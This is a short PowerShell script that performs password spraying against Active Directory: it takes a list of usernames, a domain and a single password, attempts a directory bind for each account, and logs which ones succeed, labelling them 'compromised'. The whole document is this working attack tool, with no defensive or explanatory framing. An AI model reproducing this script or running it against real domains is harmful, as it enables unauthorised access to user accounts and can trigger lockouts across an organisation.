Function adcheck {
  param($u,$p)
  (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null
}
 
Function adlogin {
  param($userlist,$domain,$pswd)

  if (!$pswd) {
    Write-Host "usage: adlogin <userlist.txt> <domain> <password>"
    Write-Host " e.g.: adlogin users.txt domain.com P@ssw0rd`n"
    return
  }
  $results = ".\adlogin.$pswd.txt"

  foreach($line in gc $userlist) {
    $x = (gc $results -EA SilentlyContinue | sls "^$line,.*,True$")
    if ($x) {
      Write-Host "user $line already compromised"
      continue
    }
    $x = (gc $results | sls -CaseSensitive "^$line,$pswd,")
    if ($x) {
      Write-Host "user $line with $pswd already tried"
      continue
    }
    $output = "$line,$pswd,"
    $output += adcheck "$domain\$line" "$pswd"
    Write-Host "$output"
    echo $output >>$results
  }
}
